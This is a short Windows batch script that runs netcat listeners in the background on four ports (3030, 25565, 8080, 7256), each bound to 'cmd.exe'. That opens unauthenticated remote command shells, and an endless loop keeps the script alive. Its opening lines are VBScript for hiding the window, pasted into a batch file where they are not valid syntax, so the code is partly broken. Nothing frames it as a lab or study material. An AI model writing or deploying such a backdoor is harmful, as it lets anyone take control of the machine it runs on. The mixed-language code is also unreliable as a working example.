@echo off

Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "C:\path\to\your\batchfile.bat" & Chr(34), 0
Set WshShell = Nothing

REM Start a Netcat listener on port 3030 in the background
START /B netcat-1.11\nc.exe -l -p 3030 -e cmd.exe

REM Start a Netcat listener on port 25565 in the background
START /B netcat-1.11\nc.exe -l -p 25565 -e cmd.exe

REM Start a Netcat listener on port 8080 in the background
START /B netcat-1.11\nc.exe -l -p 8080 -e cmd.exe

REM Start a Netcat listener on port 7256 in the background
START /B netcat-1.11\nc.exe -l -p 7256 -e cmd.exe

REM Keep the batch file running indefinitely
:loop
timeout /t 1 > NUL
goto loop